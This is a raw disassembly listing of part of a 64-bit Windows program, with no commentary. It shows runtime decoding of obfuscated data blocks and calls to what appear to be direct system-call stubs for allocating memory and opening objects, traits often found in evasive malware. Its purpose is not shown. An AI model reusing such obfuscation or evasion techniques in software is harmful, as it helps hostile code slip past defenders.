   14000612b:	66 0f 6f 05 0d 57 00 	movdqa 0x570d(%rip),%xmm0        # 0x14000b840
   140006132:	00 
   140006133:	66 0f 6f 0d f5 ab 2b 	movdqa 0x2babf5(%rip),%xmm1        # 0x1402c0d30
   14000613a:	00 
   14000613b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000613f:	66 0f 6f 15 d9 54 00 	movdqa 0x54d9(%rip),%xmm2        # 0x14000b620
   140006146:	00 
   140006147:	66 0f db ca          	pand   %xmm2,%xmm1
   14000614b:	66 0f 7f 0d dd ab 2b 	movdqa %xmm1,0x2babdd(%rip)        # 0x1402c0d30
   140006152:	00 
   140006153:	66 0f 6f 0d e5 ab 2b 	movdqa 0x2babe5(%rip),%xmm1        # 0x1402c0d40
   14000615a:	00 
   14000615b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000615f:	66 0f db ca          	pand   %xmm2,%xmm1
   140006163:	66 0f 7f 0d d5 ab 2b 	movdqa %xmm1,0x2babd5(%rip)        # 0x1402c0d40
   14000616a:	00 
   14000616b:	66 0f 6f 0d dd ab 2b 	movdqa 0x2babdd(%rip),%xmm1        # 0x1402c0d50
   140006172:	00 
   140006173:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006177:	66 0f db ca          	pand   %xmm2,%xmm1
   14000617b:	66 0f 7f 0d cd ab 2b 	movdqa %xmm1,0x2babcd(%rip)        # 0x1402c0d50
   140006182:	00 
   140006183:	66 0f 6f 0d d5 ab 2b 	movdqa 0x2babd5(%rip),%xmm1        # 0x1402c0d60
   14000618a:	00 
   14000618b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000618f:	66 0f db ca          	pand   %xmm2,%xmm1
   140006193:	66 0f 7f 0d c5 ab 2b 	movdqa %xmm1,0x2babc5(%rip)        # 0x1402c0d60
   14000619a:	00 
   14000619b:	66 0f 6f 0d cd ab 2b 	movdqa 0x2babcd(%rip),%xmm1        # 0x1402c0d70
   1400061a2:	00 
   1400061a3:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400061a7:	66 0f db ca          	pand   %xmm2,%xmm1
   1400061ab:	66 0f 7f 0d bd ab 2b 	movdqa %xmm1,0x2babbd(%rip)        # 0x1402c0d70
   1400061b2:	00 
   1400061b3:	66 0f fd 05 c5 ab 2b 	paddw  0x2babc5(%rip),%xmm0        # 0x1402c0d80
   1400061ba:	00 
   1400061bb:	66 0f db c2          	pand   %xmm2,%xmm0
   1400061bf:	66 0f 7f 05 b9 ab 2b 	movdqa %xmm0,0x2babb9(%rip)        # 0x1402c0d80
   1400061c6:	00 
   1400061c7:	8b 05 c3 ab 2b 00    	mov    0x2babc3(%rip),%eax        # 0x1402c0d90
   1400061cd:	83 c0 69             	add    $0x69,%eax
   1400061d0:	0f b6 c0             	movzbl %al,%eax
   1400061d3:	66 89 05 b6 ab 2b 00 	mov    %ax,0x2babb6(%rip)        # 0x1402c0d90
   1400061da:	c6 05 b1 ab 2b 00 00 	movb   $0x0,0x2babb1(%rip)        # 0x1402c0d92
   1400061e1:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400061e6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400061eb:	4c 8d 0d 3e ab 2b 00 	lea    0x2bab3e(%rip),%r9        # 0x1402c0d30
   1400061f2:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400061f9:	b1 01                	mov    $0x1,%cl
   1400061fb:	49 89 f8             	mov    %rdi,%r8
   1400061fe:	e8 ed cb ff ff       	call   0x140002df0
   140006203:	48 8d 8d 30 0c 00 00 	lea    0xc30(%rbp),%rcx
   14000620a:	48 8d 95 20 0a 00 00 	lea    0xa20(%rbp),%rdx
   140006211:	e8 6a 44 00 00       	call   0x14000a680
   140006216:	85 c0                	test   %eax,%eax
   140006218:	0f 84 83 03 00 00    	je     0x1400065a1
   14000621e:	48 8d b5 60 12 00 00 	lea    0x1260(%rbp),%rsi
   140006225:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   14000622b:	48 89 f1             	mov    %rsi,%rcx
   14000622e:	31 d2                	xor    %edx,%edx
   140006230:	e8 ab 44 00 00       	call   0x14000a6e0
   140006235:	80 3d 79 a0 2b 00 00 	cmpb   $0x0,0x2ba079(%rip)        # 0x1402c02b5
   14000623c:	0f 84 5b 1e 00 00    	je     0x14000809d
   140006242:	80 3d 29 bb 2b 00 00 	cmpb   $0x0,0x2bbb29(%rip)        # 0x1402c1d72
   140006249:	74 3c                	je     0x140006287
   14000624b:	f3 0f 7e 05 15 bb 2b 	movq   0x2bbb15(%rip),%xmm0        # 0x1402c1d68
   140006252:	00 
   140006253:	66 0f fd 05 f5 57 00 	paddw  0x57f5(%rip),%xmm0        # 0x14000ba50
   14000625a:	00 
   14000625b:	66 0f db 05 fd 53 00 	pand   0x53fd(%rip),%xmm0        # 0x14000b660
   140006262:	00 
   140006263:	66 0f d6 05 fd ba 2b 	movq   %xmm0,0x2bbafd(%rip)        # 0x1402c1d68
   14000626a:	00 
   14000626b:	b8 c5 00 00 00       	mov    $0xc5,%eax
   140006270:	03 05 fa ba 2b 00    	add    0x2bbafa(%rip),%eax        # 0x1402c1d70
   140006276:	0f b6 c0             	movzbl %al,%eax
   140006279:	66 89 05 f0 ba 2b 00 	mov    %ax,0x2bbaf0(%rip)        # 0x1402c1d70
   140006280:	c6 05 eb ba 2b 00 00 	movb   $0x0,0x2bbaeb(%rip)        # 0x1402c1d72
   140006287:	48 8d 15 da ba 2b 00 	lea    0x2bbada(%rip),%rdx        # 0x1402c1d68
   14000628e:	48 89 f1             	mov    %rsi,%rcx
   140006291:	e8 5a 43 00 00       	call   0x14000a5f0
   140006296:	48 8d 95 30 0c 00 00 	lea    0xc30(%rbp),%rdx
   14000629d:	48 89 f1             	mov    %rsi,%rcx
   1400062a0:	e8 3b 43 00 00       	call   0x14000a5e0
   1400062a5:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   1400062ac:	00 00 00 00 
   1400062b0:	48 89 f1             	mov    %rsi,%rcx
   1400062b3:	e8 48 43 00 00       	call   0x14000a600
   1400062b8:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400062bf:	01 c0                	add    %eax,%eax
   1400062c1:	66 89 8d 42 17 00 00 	mov    %cx,0x1742(%rbp)
   1400062c8:	66 89 85 40 17 00 00 	mov    %ax,0x1740(%rbp)
   1400062cf:	48 89 b5 48 17 00 00 	mov    %rsi,0x1748(%rbp)
   1400062d6:	0f 57 f6             	xorps  %xmm6,%xmm6
   1400062d9:	0f 29 b5 70 14 00 00 	movaps %xmm6,0x1470(%rbp)
   1400062e0:	0f 29 b5 80 14 00 00 	movaps %xmm6,0x1480(%rbp)
   1400062e7:	c7 85 70 14 00 00 30 	movl   $0x30,0x1470(%rbp)
   1400062ee:	00 00 00 
   1400062f1:	c7 85 88 14 00 00 40 	movl   $0x40,0x1488(%rbp)
   1400062f8:	00 00 00 
   1400062fb:	48 8d 85 40 17 00 00 	lea    0x1740(%rbp),%rax
   140006302:	48 89 85 80 14 00 00 	mov    %rax,0x1480(%rbp)
   140006309:	0f 29 b5 90 14 00 00 	movaps %xmm6,0x1490(%rbp)
   140006310:	48 c7 85 28 17 00 00 	movq   $0x0,0x1728(%rbp)
   140006317:	00 00 00 00 
   14000631b:	0f 29 b5 30 17 00 00 	movaps %xmm6,0x1730(%rbp)
   140006322:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140006329:	00 
   14000632a:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140006331:	00 
   140006332:	48 8d 8d 28 17 00 00 	lea    0x1728(%rbp),%rcx
   140006339:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006340:	48 8d b5 30 17 00 00 	lea    0x1730(%rbp),%rsi
   140006347:	ba 00 00 10 80       	mov    $0x80100000,%edx
   14000634c:	49 89 f1             	mov    %rsi,%r9
   14000634f:	e8 19 b1 ff ff       	call   0x14000146d
   140006354:	0f 29 b5 f0 16 00 00 	movaps %xmm6,0x16f0(%rbp)
   14000635b:	48 c7 85 00 17 00 00 	movq   $0x0,0x1700(%rbp)
   140006362:	00 00 00 00 
   140006366:	48 8b 8d 28 17 00 00 	mov    0x1728(%rbp),%rcx
   14000636d:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   140006374:	00 
   140006375:	4c 8d 85 f0 16 00 00 	lea    0x16f0(%rbp),%r8
   14000637c:	48 89 f2             	mov    %rsi,%rdx
   14000637f:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   140006385:	e8 a6 b1 ff ff       	call   0x140001530
   14000638a:	85 c0                	test   %eax,%eax
   14000638c:	0f 88 14 21 00 00    	js     0x1400084a6
   140006392:	4c 8b b5 f8 16 00 00 	mov    0x16f8(%rbp),%r14
   140006399:	48 c7 85 e0 16 00 00 	movq   $0x0,0x16e0(%rbp)
   1400063a0:	00 00 00 00 
   1400063a4:	4c 89 b5 80 16 00 00 	mov    %r14,0x1680(%rbp)
   1400063ab:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400063b2:	00 
   1400063b3:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   1400063ba:	00 
   1400063bb:	48 8d 95 e0 16 00 00 	lea    0x16e0(%rbp),%rdx
   1400063c2:	31 db                	xor    %ebx,%ebx
   1400063c4:	4c 8d 8d 80 16 00 00 	lea    0x1680(%rbp),%r9
   1400063cb:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400063d2:	45 31 c0             	xor    %r8d,%r8d
   1400063d5:	e8 cf b0 ff ff       	call   0x1400014a9
   1400063da:	85 c0                	test   %eax,%eax
   1400063dc:	78 50                	js     0x14000642e
   1400063de:	48 8b 8d 28 17 00 00 	mov    0x1728(%rbp),%rcx
   1400063e5:	48 8b 85 e0 16 00 00 	mov    0x16e0(%rbp),%rax
   1400063ec:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400063f0:	f3 0f 7f 44 24 38    	movdqu %xmm0,0x38(%rsp)
   1400063f6:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   1400063fb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006400:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006405:	31 d2                	xor    %edx,%edx
   140006407:	45 31 c0             	xor    %r8d,%r8d
   14000640a:	45 31 c9             	xor    %r9d,%r9d
   14000640d:	e8 2e b0 ff ff       	call   0x140001440
   140006412:	85 c0                	test   %eax,%eax
   140006414:	78 18                	js     0x14000642e
   140006416:	48 8b 8d 28 17 00 00 	mov    0x1728(%rbp),%rcx
   14000641d:	e8 3c b0 ff ff       	call   0x14000145e
   140006422:	48 8b 95 e0 16 00 00 	mov    0x16e0(%rbp),%rdx
   140006429:	44 89 f3             	mov    %r14d,%ebx
   14000642c:	eb 0e                	jmp    0x14000643c
   14000642e:	48 8b 8d 28 17 00 00 	mov    0x1728(%rbp),%rcx
   140006435:	e8 24 b0 ff ff       	call   0x14000145e
   14000643a:	31 d2                	xor    %edx,%edx
   14000643c:	48 89 95 60 12 00 00 	mov    %rdx,0x1260(%rbp)
   140006443:	48 8d 8d 20 0a 00 00 	lea    0xa20(%rbp),%rcx
   14000644a:	41 89 d8             	mov    %ebx,%r8d
   14000644d:	e8 fe ce ff ff       	call   0x140003350
   140006452:	48 c7 85 70 14 00 00 	movq   $0x0,0x1470(%rbp)
   140006459:	00 00 00 00 
   14000645d:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140006464:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   14000646b:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140006472:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140006478:	e8 4a b0 ff ff       	call   0x1400014c7
   14000647d:	80 3d 22 9e 2b 00 00 	cmpb   $0x0,0x2b9e22(%rip)        # 0x1402c02a6
   140006484:	0f 84 59 1c 00 00    	je     0x1400080e3
   14000648a:	80 3d 31 a9 2b 00 00 	cmpb   $0x0,0x2ba931(%rip)        # 0x1402c0dc2
   140006491:	74 56                	je     0x1400064e9
   140006493:	66 0f 6f 05 c5 55 00 	movdqa 0x55c5(%rip),%xmm0        # 0x14000ba60
   14000649a:	00 
   14000649b:	66 0f 6f 0d fd a8 2b 	movdqa 0x2ba8fd(%rip),%xmm1        # 0x1402c0da0
   1400064a2:	00 
   1400064a3:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400064a7:	66 0f 6f 15 71 51 00 	movdqa 0x5171(%rip),%xmm2        # 0x14000b620
   1400064ae:	00 
   1400064af:	66 0f db ca          	pand   %xmm2,%xmm1
   1400064b3:	66 0f 7f 0d e5 a8 2b 	movdqa %xmm1,0x2ba8e5(%rip)        # 0x1402c0da0
   1400064ba:	00 
   1400064bb:	66 0f fd 05 ed a8 2b 	paddw  0x2ba8ed(%rip),%xmm0        # 0x1402c0db0
   1400064c2:	00 
   1400064c3:	66 0f db c2          	pand   %xmm2,%xmm0
   1400064c7:	66 0f 7f 05 e1 a8 2b 	movdqa %xmm0,0x2ba8e1(%rip)        # 0x1402c0db0
   1400064ce:	00 
   1400064cf:	8b 05 eb a8 2b 00    	mov    0x2ba8eb(%rip),%eax        # 0x1402c0dc0
   1400064d5:	83 c0 61             	add    $0x61,%eax
   1400064d8:	0f b6 c0             	movzbl %al,%eax
   1400064db:	66 89 05 de a8 2b 00 	mov    %ax,0x2ba8de(%rip)        # 0x1402c0dc0
   1400064e2:	c6 05 d9 a8 2b 00 00 	movb   $0x0,0x2ba8d9(%rip)        # 0x1402c0dc2
   1400064e9:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400064ee:	4c 8d 0d ab a8 2b 00 	lea    0x2ba8ab(%rip),%r9        # 0x1402c0da0
   1400064f5:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400064fc:	31 c9                	xor    %ecx,%ecx
   1400064fe:	49 89 f8             	mov    %rdi,%r8
   140006501:	e8 ea c8 ff ff       	call   0x140002df0
   140006506:	80 3d 9a 9d 2b 00 00 	cmpb   $0x0,0x2b9d9a(%rip)        # 0x1402c02a7
   14000650d:	0f 84 01 1c 00 00    	je     0x140008114
   140006513:	80 3d de a8 2b 00 00 	cmpb   $0x0,0x2ba8de(%rip)        # 0x1402c0df8
   14000651a:	74 63                	je     0x14000657f
   14000651c:	66 0f 6f 05 4c 55 00 	movdqa 0x554c(%rip),%xmm0        # 0x14000ba70
   140006523:	00 
   140006524:	66 0f 6f 0d a4 a8 2b 	movdqa 0x2ba8a4(%rip),%xmm1        # 0x1402c0dd0
   14000652b:	00 
   14000652c:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006530:	66 0f 6f 15 e8 50 00 	movdqa 0x50e8(%rip),%xmm2        # 0x14000b620
   140006537:	00 
   140006538:	66 0f db ca          	pand   %xmm2,%xmm1
   14000653c:	66 0f 7f 0d 8c a8 2b 	movdqa %xmm1,0x2ba88c(%rip)        # 0x1402c0dd0
   140006543:	00 
   140006544:	66 0f fd 05 94 a8 2b 	paddw  0x2ba894(%rip),%xmm0        # 0x1402c0de0
   14000654b:	00 
   14000654c:	66 0f db c2          	pand   %xmm2,%xmm0
   140006550:	66 0f 7f 05 88 a8 2b 	movdqa %xmm0,0x2ba888(%rip)        # 0x1402c0de0
   140006557:	00 
   140006558:	f3 0f 7e 05 90 a8 2b 	movq   0x2ba890(%rip),%xmm0        # 0x1402c0df0
   14000655f:	00 
   140006560:	66 0f fd 05 18 55 00 	paddw  0x5518(%rip),%xmm0        # 0x14000ba80
   140006567:	00 
   140006568:	66 0f db 05 f0 50 00 	pand   0x50f0(%rip),%xmm0        # 0x14000b660
   14000656f:	00 
   140006570:	66 0f d6 05 78 a8 2b 	movq   %xmm0,0x2ba878(%rip)        # 0x1402c0df0
   140006577:	00 
   140006578:	c6 05 79 a8 2b 00 00 	movb   $0x0,0x2ba879(%rip)        # 0x1402c0df8
   14000657f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006584:	4c 8d 0d 45 a8 2b 00 	lea    0x2ba845(%rip),%r9        # 0x1402c0dd0
   14000658b:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140006592:	31 c9                	xor    %ecx,%ecx
   140006594:	49 89 f8             	mov    %rdi,%r8
   140006597:	e8 54 c8 ff ff       	call   0x140002df0
   14000659c:	e9 be 0d 00 00       	jmp    0x14000735f
   1400065a1:	80 3d 00 9d 2b 00 00 	cmpb   $0x0,0x2b9d00(%rip)        # 0x1402c02a8
   1400065a8:	0f 84 97 1b 00 00    	je     0x140008145
   1400065ae:	80 3d 8f a8 2b 00 00 	cmpb   $0x0,0x2ba88f(%rip)        # 0x1402c0e44
   1400065b5:	0f 84 9a 00 00 00    	je     0x140006655
   1400065bb:	66 0f 6f 05 dd 50 00 	movdqa 0x50dd(%rip),%xmm0        # 0x14000b6a0
   1400065c2:	00 
   1400065c3:	66 0f 6f 0d 35 a8 2b 	movdqa 0x2ba835(%rip),%xmm1        # 0x1402c0e00
   1400065ca:	00 
   1400065cb:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400065cf:	66 0f 6f 15 49 50 00 	movdqa 0x5049(%rip),%xmm2        # 0x14000b620
   1400065d6:	00 
   1400065d7:	66 0f db ca          	pand   %xmm2,%xmm1
   1400065db:	66 0f 7f 0d 1d a8 2b 	movdqa %xmm1,0x2ba81d(%rip)        # 0x1402c0e00
   1400065e2:	00 
   1400065e3:	66 0f 6f 0d 25 a8 2b 	movdqa 0x2ba825(%rip),%xmm1        # 0x1402c0e10
   1400065ea:	00 
   1400065eb:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400065ef:	66 0f db ca          	pand   %xmm2,%xmm1
   1400065f3:	66 0f 7f 0d 15 a8 2b 	movdqa %xmm1,0x2ba815(%rip)        # 0x1402c0e10
   1400065fa:	00 
   1400065fb:	66 0f 6f 0d 1d a8 2b 	movdqa 0x2ba81d(%rip),%xmm1        # 0x1402c0e20
   140006602:	00 
   140006603:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006607:	66 0f db ca          	pand   %xmm2,%xmm1
   14000660b:	66 0f 7f 0d 0d a8 2b 	movdqa %xmm1,0x2ba80d(%rip)        # 0x1402c0e20
   140006612:	00 
   140006613:	66 0f fd 05 15 a8 2b 	paddw  0x2ba815(%rip),%xmm0        # 0x1402c0e30
   14000661a:	00 
   14000661b:	66 0f db c2          	pand   %xmm2,%xmm0
   14000661f:	66 0f 7f 05 09 a8 2b 	movdqa %xmm0,0x2ba809(%rip)        # 0x1402c0e30
   140006626:	00 
   140006627:	8b 05 13 a8 2b 00    	mov    0x2ba813(%rip),%eax        # 0x1402c0e40
   14000662d:	83 c0 43             	add    $0x43,%eax
   140006630:	0f b6 c0             	movzbl %al,%eax
   140006633:	66 89 05 06 a8 2b 00 	mov    %ax,0x2ba806(%rip)        # 0x1402c0e40
   14000663a:	0f b7 05 01 a8 2b 00 	movzwl 0x2ba801(%rip),%eax        # 0x1402c0e42
   140006641:	83 c0 43             	add    $0x43,%eax
   140006644:	0f b6 c0             	movzbl %al,%eax
   140006647:	66 89 05 f4 a7 2b 00 	mov    %ax,0x2ba7f4(%rip)        # 0x1402c0e42
   14000664e:	c6 05 ef a7 2b 00 00 	movb   $0x0,0x2ba7ef(%rip)        # 0x1402c0e44
   140006655:	48 c7 85 70 14 00 00 	movq   $0x0,0x1470(%rbp)
   14000665c:	00 00 00 00 
   140006660:	48 8d 3d 99 a7 2b 00 	lea    0x2ba799(%rip),%rdi        # 0x1402c0e00
   140006667:	48 89 f9             	mov    %rdi,%rcx
   14000666a:	e8 91 3f 00 00       	call   0x14000a600
   14000666f:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140006676:	01 c0                	add    %eax,%eax
   140006678:	66 89 8d 72 14 00 00 	mov    %cx,0x1472(%rbp)
   14000667f:	66 89 85 70 14 00 00 	mov    %ax,0x1470(%rbp)
   140006686:	48 89 bd 78 14 00 00 	mov    %rdi,0x1478(%rbp)
   14000668d:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140006691:	66 0f 7f 85 60 12 00 	movdqa %xmm0,0x1260(%rbp)
   140006698:	00 
   140006699:	66 0f 7f 85 70 12 00 	movdqa %xmm0,0x1270(%rbp)
   1400066a0:	00 
   1400066a1:	c7 85 60 12 00 00 30 	movl   $0x30,0x1260(%rbp)
   1400066a8:	00 00 00 
   1400066ab:	4c 89 a5 70 12 00 00 	mov    %r12,0x1270(%rbp)
   1400066b2:	66 0f 7f 85 80 12 00 	movdqa %xmm0,0x1280(%rbp)
   1400066b9:	00 
   1400066ba:	48 c7 85 f0 16 00 00 	movq   $0x0,0x16f0(%rbp)
   1400066c1:	00 00 00 00 
   1400066c5:	48 8d 8d f0 16 00 00 	lea    0x16f0(%rbp),%rcx
   1400066cc:	4c 8d 85 60 12 00 00 	lea    0x1260(%rbp),%r8
   1400066d3:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   1400066d8:	45 31 c9             	xor    %r9d,%r9d
   1400066db:	e8 5f ae ff ff       	call   0x14000153f
   1400066e0:	89 c3                	mov    %eax,%ebx
   1400066e2:	48 8b bd f0 16 00 00 	mov    0x16f0(%rbp),%rdi
   1400066e9:	48 89 f9             	mov    %rdi,%rcx
   1400066ec:	e8 6d ad ff ff       	call   0x14000145e
   1400066f1:	85 db                	test   %ebx,%ebx
   1400066f3:	0f 88 84 00 00 00    	js     0x14000677d
   1400066f9:	48 ff c7             	inc    %rdi
   1400066fc:	48 83 ff 02          	cmp    $0x2,%rdi
   140006700:	72 7b                	jb     0x14000677d
   140006702:	48 8d 0d 57 79 00 00 	lea    0x7957(%rip),%rcx        # 0x14000e060
   140006709:	4c 8d 85 f0 16 00 00 	lea    0x16f0(%rbp),%r8
   140006710:	ba 58 9d 00 00       	mov    $0x9d58,%edx
   140006715:	e8 56 c8 ff ff       	call   0x140002f70
   14000671a:	48 89 c3             	mov    %rax,%rbx
   14000671d:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140006722:	48 8d 8d 10 08 00 00 	lea    0x810(%rbp),%rcx
   140006729:	48 89 ca             	mov    %rcx,%rdx
   14000672c:	45 31 c0             	xor    %r8d,%r8d
   14000672f:	49 89 c1             	mov    %rax,%r9
   140006732:	e8 79 d2 ff ff       	call   0x1400039b0
   140006737:	48 89 c7             	mov    %rax,%rdi
   14000673a:	48 8b 85 f0 16 00 00 	mov    0x16f0(%rbp),%rax
   140006741:	48 89 85 60 12 00 00 	mov    %rax,0x1260(%rbp)
   140006748:	48 89 9d 70 14 00 00 	mov    %rbx,0x1470(%rbp)
   14000674f:	48 8d 95 70 14 00 00 	lea    0x1470(%rbp),%rdx
   140006756:	4c 8d 85 60 12 00 00 	lea    0x1260(%rbp),%r8
   14000675d:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140006764:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   14000676a:	e8 58 ad ff ff       	call   0x1400014c7
   14000676f:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   140006773:	74 08                	je     0x14000677d
   140006775:	48 89 f9             	mov    %rdi,%rcx
   140006778:	e8 e1 ac ff ff       	call   0x14000145e
   14000677d:	80 3d 25 9b 2b 00 00 	cmpb   $0x0,0x2b9b25(%rip)        # 0x1402c02a9
   140006784:	0f 84 ec 19 00 00    	je     0x140008176
   14000678a:	80 3d c3 a6 2b 00 00 	cmpb   $0x0,0x2ba6c3(%rip)        # 0x1402c0e54
   140006791:	74 47                	je     0x1400067da
   140006793:	f3 0f 7e 05 ad a6 2b 	movq   0x2ba6ad(%rip),%xmm0        # 0x1402c0e48
   14000679a:	00 
   14000679b:	66 0f fd 05 ed 52 00 	paddw  0x52ed(%rip),%xmm0        # 0x14000ba90
   1400067a2:	00 
   1400067a3:	66 0f db 05 b5 4e 00 	pand   0x4eb5(%rip),%xmm0        # 0x14000b660
   1400067aa:	00 
   1400067ab:	66 0f d6 05 95 a6 2b 	movq   %xmm0,0x2ba695(%rip)        # 0x1402c0e48
   1400067b2:	00 
   1400067b3:	f3 0f 7e 05 95 a6 2b 	movq   0x2ba695(%rip),%xmm0        # 0x1402c0e50
   1400067ba:	00 
   1400067bb:	66 0f fd 05 dd 52 00 	paddw  0x52dd(%rip),%xmm0        # 0x14000baa0
   1400067c2:	00 
   1400067c3:	66 0f db 05 c5 4e 00 	pand   0x4ec5(%rip),%xmm0        # 0x14000b690
   1400067ca:	00 
   1400067cb:	66 0f 7e 05 7d a6 2b 	movd   %xmm0,0x2ba67d(%rip)        # 0x1402c0e50
   1400067d2:	00 
   1400067d3:	c6 05 7a a6 2b 00 00 	movb   $0x0,0x2ba67a(%rip)        # 0x1402c0e54
   1400067da:	48 8d 0d 67 a6 2b 00 	lea    0x2ba667(%rip),%rcx        # 0x1402c0e48
   1400067e1:	e8 1a 3e 00 00       	call   0x14000a600
   1400067e6:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   1400067ea:	0f 84 28 01 00 00    	je     0x140006918
   1400067f0:	48 89 c3             	mov    %rax,%rbx
   1400067f3:	4c 8d 35 4e a6 2b 00 	lea    0x2ba64e(%rip),%r14        # 0x1402c0e48
   1400067fa:	31 ff                	xor    %edi,%edi
   1400067fc:	49 89 f7             	mov    %rsi,%r15
   1400067ff:	90                   	nop
   140006800:	4c 89 f9             	mov    %r15,%rcx
   140006803:	4c 89 f2             	mov    %r14,%rdx
   140006806:	49 89 d8             	mov    %rbx,%r8
   140006809:	e8 82 3e 00 00       	call   0x14000a690
   14000680e:	85 c0                	test   %eax,%eax
   140006810:	0f 84 06 01 00 00    	je     0x14000691c
   140006816:	4c 89 f9             	mov    %r15,%rcx
   140006819:	e8 e2 3d 00 00       	call   0x14000a600
   14000681e:	66 41 83 7c 47 02 00 	cmpw   $0x0,0x2(%r15,%rax,2)
   140006825:	4d 8d 7c 47 02       	lea    0x2(%r15,%rax,2),%r15
   14000682a:	75 d4                	jne    0x140006800
   14000682c:	e9 ef 00 00 00       	jmp    0x140006920
   140006831:	80 3d 44 9a 2b 00 00 	cmpb   $0x0,0x2b9a44(%rip)        # 0x1402c027c
   140006838:	0f 84 21 1c 00 00    	je     0x14000845f
   14000683e:	80 3d 3f 9b 2b 00 00 	cmpb   $0x0,0x2b9b3f(%rip)        # 0x1402c0384
   140006845:	74 47                	je     0x14000688e
   140006847:	f3 0f 7e 05 29 9b 2b 	movq   0x2b9b29(%rip),%xmm0        # 0x1402c0378
   14000684e:	00 
   14000684f:	66 0f fd 05 d9 4f 00 	paddw  0x4fd9(%rip),%xmm0        # 0x14000b830
   140006856:	00 
   140006857:	66 0f db 05 01 4e 00 	pand   0x4e01(%rip),%xmm0        # 0x14000b660
   14000685e:	00 
   14000685f:	66 0f d6 05 11 9b 2b 	movq   %xmm0,0x2b9b11(%rip)        # 0x1402c0378
   140006866:	00 
   140006867:	f3 0f 7e 05 11 9b 2b 	movq   0x2b9b11(%rip),%xmm0        # 0x1402c0380
   14000686e:	00 
   14000686f:	66 0f fd 05 a9 51 00 	paddw  0x51a9(%rip),%xmm0        # 0x14000ba20
   140006876:	00 
   140006877:	66 0f db 05 11 4e 00 	pand   0x4e11(%rip),%xmm0        # 0x14000b690
   14000687e:	00 
   14000687f:	66 0f 7e 05 f9 9a 2b 	movd   %xmm0,0x2b9af9(%rip)        # 0x1402c0380
   140006886:	00 
   140006887:	c6 05 f6 9a 2b 00 00 	movb   $0x0,0x2b9af6(%rip)        # 0x1402c0384
   14000688e:	4c 8d 35 e3 9a 2b 00 	lea    0x2b9ae3(%rip),%r14        # 0x1402c0378
   140006895:	4c 89 f1             	mov    %r14,%rcx
   140006898:	e8 63 3d 00 00       	call   0x14000a600
   14000689d:	89 c1                	mov    %eax,%ecx
   14000689f:	c1 e1 11             	shl    $0x11,%ecx
   1400068a2:	25 ff 7f 00 00       	and    $0x7fff,%eax
   1400068a7:	8d 04 41             	lea    (%rcx,%rax,2),%eax
   1400068aa:	05 00 00 02 00       	add    $0x20000,%eax
   1400068af:	48 89 85 40 17 00 00 	mov    %rax,0x1740(%rbp)
   1400068b6:	4c 89 b5 48 17 00 00 	mov    %r14,0x1748(%rbp)
   1400068bd:	48 8b 8d 30 17 00 00 	mov    0x1730(%rbp),%rcx
   1400068c4:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1400068c9:	c7 44 24 20 00 02 00 	movl   $0x200,0x20(%rsp)
   1400068d0:	00 
   1400068d1:	48 8d 95 40 17 00 00 	lea    0x1740(%rbp),%rdx
   1400068d8:	4c 8d 8d 60 12 00 00 	lea    0x1260(%rbp),%r9
   1400068df:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400068e5:	e8 be ac ff ff       	call   0x1400015a8
   1400068ea:	41 89 c6             	mov    %eax,%r14d
   1400068ed:	44 8b ad 6c 12 00 00 	mov    0x126c(%rbp),%r13d
   1400068f4:	48 8b 8d 30 17 00 00 	mov    0x1730(%rbp),%rcx
   1400068fb:	e8 5e ab ff ff       	call   0x14000145e
   140006900:	45 85 f6             	test   %r14d,%r14d
   140006903:	0f 88 5d f7 ff ff    	js     0x140006066
   140006909:	41 83 fd 02          	cmp    $0x2,%r13d
   14000690d:	0f 84 f0 f8 ff ff    	je     0x140006203
   140006913:	e9 4e f7 ff ff       	jmp    0x140006066
   140006918:	31 ff                	xor    %edi,%edi
   14000691a:	eb 04                	jmp    0x140006920
